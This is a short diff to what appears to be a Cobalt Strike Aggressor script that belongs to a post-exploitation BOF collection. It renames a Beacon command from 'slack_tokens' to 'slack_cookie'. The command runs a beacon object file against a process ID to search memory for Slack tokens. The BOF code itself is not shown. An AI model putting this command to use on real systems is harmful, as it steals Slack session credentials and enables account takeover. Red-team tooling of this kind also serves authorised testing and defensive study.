@@ -1822,25 +1822,25 @@ They are the equivilent of what you see in whoami /all or our whoami bof from th
 "
 );
 
-alias slack_tokens 
+alias slack_cookie 
 {
 	local('$pid $args');
 	if(size(@_) != 2)
 	{
-		berror($1, "usage: slack_tokens <pid>");
+		berror($1, "usage: slack_cookie <pid>");
 		return;
 	}
 	$pid = parseNumber($2, 10);
     berror($1, $pid);
 
 	$args = bof_pack($1, "i", $pid);
-	beacon_inline_execute($1, readbof($1, "slack_tokens"), "go", $args);
+	beacon_inline_execute($1, readbof($1, "slack_cookie"), "go", $args);
 }
 
 beacon_command_register(
-	"slack_tokens",
+	"slack_cookie",
 	"Searches memory for Slack tokens",
-	"Command: slack_tokens
+	"Command: slack_cookie
 
-Usage: slack_tokens <pid> "
+Usage: slack_cookie <pid> "
 );
